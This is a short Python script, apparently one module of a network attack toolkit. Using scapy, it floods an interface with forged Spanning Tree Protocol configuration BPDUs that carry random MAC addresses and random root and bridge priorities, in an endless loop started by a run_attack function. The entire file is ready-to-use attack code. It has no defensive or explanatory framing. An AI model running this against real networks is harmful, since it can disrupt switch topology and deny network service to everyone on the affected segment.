# -*- coding: utf-8 -*-

from scapy.layers.l2 import Ether, LLC, STP, Dot3
from scapy.all import sendp, RandMAC, RandInt


# --------------------------------------------------------------------------
#
# --------------------------------------------------------------------------

def run(inter):

    interface = str(inter[0])
    if len(interface) > 0:
        try:

            while 1:
                # Root Identifier 8 bytes

                srcMAC = str(RandMAC())     # Random MAC in each iteration
                root_prior = RandInt() % 65536  # 2 bytes

                # Brigde Identifier
                brigde_prior = RandInt() % 65536  # 2 bytes

                p_ether = Dot3(dst="01:80:c2:00:00:00", src=srcMAC)
                p_llc = LLC()

                p_stp = STP(bpdutype=0x00, bpduflags=0x01, portid=0x8002, rootmac=srcMAC, bridgemac=srcMAC,rootid=root_prior, bridgeid=brigde_prior)   # Conf packet

                pkt = p_ether/p_llc/p_stp   # STP packet structure

                sendp(pkt, iface=interface, verbose=0)

        except KeyboardInterrupt:
            pass


def run_attack(config):
    run(config.interface)